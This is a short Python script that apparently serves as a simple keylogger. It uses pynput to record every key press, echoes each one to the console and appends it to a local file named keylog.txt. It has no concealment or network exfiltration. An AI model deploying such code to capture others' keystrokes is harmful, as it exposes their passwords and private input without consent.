from pynput import keyboard

def keyPressed(key):
    print(f"Key pressed: {key}")
    with open("keylog.txt", "a") as logFile:
        try:
            logFile.write(f"{key.char}\n")
        except AttributeError:
            # Handle special keys that do not have a char attribute
            logFile.write(f"{key}\n")

if __name__ == "__main__":
    # Initialize the keyboard listener
    listener = keyboard.Listener(on_press = keyPressed)

    # Start listening for key events
    listener.start()

    try:
        # Keep the program running to listen for key events
        while True:
            pass
    except KeyboardInterrupt:
        # Stop the listener on keyboard interrupt
        listener.stop()

